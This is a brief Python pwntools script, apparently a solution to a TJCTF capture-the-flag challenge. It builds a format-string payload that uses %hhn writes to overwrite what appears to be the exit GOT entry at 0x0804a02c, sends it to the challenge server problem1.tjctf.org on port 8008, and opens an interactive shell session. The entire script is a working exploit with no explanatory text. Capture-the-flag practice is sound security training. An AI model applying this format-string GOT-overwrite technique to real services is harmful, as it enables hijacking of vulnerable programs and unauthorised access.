from pwn import *
import struct

exit = struct.pack("<I", 0x0804a02c)
exit2 = struct.pack("<I", 0x0804a02c+1)

s = ""
s += exit
s += exit2
s += "EFGH"

s += "%263x"
s += "%35$hhn"

s += "%116x"
s += "%36$hhn"

print s
r = remote('problem1.tjctf.org', 8008)
r.recvline()
r.sendline('mike')
r.recvline()
r.sendline(s)
r.recvline()
r.sendline('mike')
r.interactive()
